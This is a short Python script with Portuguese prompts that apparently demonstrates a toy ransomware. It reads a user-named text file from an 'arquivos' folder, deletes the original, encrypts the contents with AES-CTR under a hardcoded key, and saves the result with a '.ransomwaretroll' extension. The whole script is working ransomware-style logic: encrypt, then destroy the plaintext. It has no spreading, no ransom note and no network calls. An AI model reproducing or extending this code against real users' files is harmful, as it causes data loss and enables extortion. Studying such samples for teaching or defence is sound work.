import os
import pyaes

print('Digite somente o nome do arquivo: ')
archive = input()

print('Lendo o arquivo ...')

source = 'arquivos/' + f'{archive}' + '.txt'
file = open(source, 'rb')
file_data = file.read()
file.close()

os.remove(source)

print('Excluindo o arquivo ...')

key = b"senhaparadesencp"

print('Criando o arquivo encriptado ...')

aes = pyaes.AESModeOfOperationCTR(key)

crypto = aes.encrypt(file_data)

new_file = source + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto)
new_file.close()

print('Sucesso !')